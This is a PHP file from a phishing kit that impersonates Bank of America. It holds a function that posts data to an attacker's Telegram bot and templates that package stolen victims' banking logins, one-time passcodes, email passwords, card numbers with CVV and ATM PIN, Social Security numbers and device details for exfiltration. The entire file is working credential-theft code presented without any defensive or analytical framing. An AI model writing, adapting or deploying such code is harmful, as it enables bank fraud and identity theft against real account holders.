<?php
include_once('functions.php');

// Function to send a message to Telegram
function sendResult($message) {
    $settings = settings();
    $apiToken = $settings['apiToken'];
    $chatID = $settings['chatID'];
    $telegramLink = "https://api.telegram.org/bot" . $apiToken . "/sendMessage";

    $postData = [
        'chat_id' => $chatID,
        'text' => $message
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $telegramLink);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
}

// Function to generate the login information message
function generateLoginMessage($userid, $passwordlogin, $date, $ip, $connectionisp, $countryname, $regioncity, $citykota, $br, $os) {
    return "
    💻 [ Bank of America Login ]
    ━━━━━━━━━━━━
    🔑 Username: {$userid}
    🔒 Password: {$passwordlogin}
    ━━━━━━━━━━━━
    
🌐 [ PC Info ]
    ━━━━━━━━━━━━
    📅 Date: {$date}
    🌍 IP Address: {$ip}
    📶 ISP: {$connectionisp}
    🚩 Country: {$countryname}
    🏙️ Region: {$regioncity}
    🌆 City: {$citykota}
    💻 OS/Browser: {$br} / {$os}
    🖥️ User Agent: {$_SERVER['HTTP_USER_AGENT']}
    ━━━━━━━━━━━━
    ";
}

// Function to generate the login information message
function generateOTPLoginMessage($userid, $passwordlogin, $otp, $date, $ip, $connectionisp, $countryname, $regioncity, $citykota, $br, $os) {
    return "
    💻 [ Bank of America Login OTP ]
    ━━━━━━━━━━━━
    🔑 Username: {$userid}
    🔒 Password: {$passwordlogin}
    🔑 OTP: {$otp}
    ━━━━━━━━━━━━
    
🌐 [ PC Info ]
    ━━━━━━━━━━━━
    📅 Date: {$date}
    🌍 IP Address: {$ip}
    📶 ISP: {$connectionisp}
    🚩 Country: {$countryname}
    🏙️ Region: {$regioncity}
    🌆 City: {$citykota}
    💻 OS/Browser: {$br} / {$os}
    🖥️ User Agent: {$_SERVER['HTTP_USER_AGENT']}
    ━━━━━━━━━━━━
    ";
}

// Function to generate email login information message
function generateEmailLoginMessage($userid, $passwordlogin, $email, $passwordemail, $date, $ip, $connectionisp, $countryname, $regioncity, $citykota, $br, $os) {
    return "
    💻 [ Bank of America Login ]
    ━━━━━━━━━━━━
    🔑 Username: {$userid}
    🔒 Password: {$passwordlogin}
    ━━━━━━━━━━━━
    
💻 [ Bank of America Email Login ]
    ━━━━━━━━━━━━
    📧 Email: {$email}
    🔒 Password: {$passwordemail}
    ━━━━━━━━━━━━
    
🌐 [ PC Info ]
    ━━━━━━━━━━━━
    📅 Date: {$date}
    🌍 IP Address: {$ip}
    📶 ISP: {$connectionisp}
    🚩 Country: {$countryname}
    🏙️ Region: {$regioncity}
    🌆 City: {$citykota}
    💻 OS/Browser: {$br} / {$os}
    🖥️ User Agent: {$_SERVER['HTTP_USER_AGENT']}
    ━━━━━━━━━━━━
    ";
}

// Function to generate full info message with detailed personal and card data
function generateFullInfoMessage(
    $username, $passwordlogin,
    $fullname, $address, $kota, $state, $zipcode, $phone, $dob, $ssn, 
    $cardnumber, $cardexpmonth, $cardexpyear, $cvv, $atmpin, $bin,
    $date, $ip, $connectionisp, $countryname, $regioncity, $citykota, $br, $os) {

    return "
    💻 [ Bank of America Login ]
    ━━━━━━━━━━━━
    🔑 Username: {$username}
    🔒 Password: {$passwordlogin}
    ━━━━━━━━━━━━
    
💳 [ Card/ Debit Information ]
    ━━━━━━━━━━━━
    🔢 Card Number: {$cardnumber}
    📇 BIN (Bank Identification Number): {$bin}
    📅 Card Expiry Date: {$cardexpmonth}/{$cardexpyear}
    🔐 CVV: {$cvv}
    🔐 ATM PIN: {$atmpin}
    ━━━━━━━━━━━━
    
👤 [ Bank of America Details Information ]
    ━━━━━━━━━━━━
    📝 Fullname: {$fullname}
    🎂 Date of Birth: {$dob}
    🆔 SSN: {$ssn} ( Social Security Number )
    🌆 State: {$state}
    🏠 Address: {$address}
    📮 Zip Code: {$zipcode}
    🌍 Country: {$countryname}
    📱 Phone Number: {$phone}
    ━━━━━━━━━━━━

🌐 [ PC Info ]
    ━━━━━━━━━━━━
    📅 Date: {$date}
    🌍 IP Address: {$ip}
    📶 ISP: {$connectionisp}
    🚩 Country: {$countryname}
    🏙️ Region: {$regioncity}
    🌆 City: {$citykota}
    💻 OS/Browser: {$br} / {$os}
    🖥️ User Agent: {$_SERVER['HTTP_USER_AGENT']}
    ━━━━━━━━━━━━
    ";
}
?>
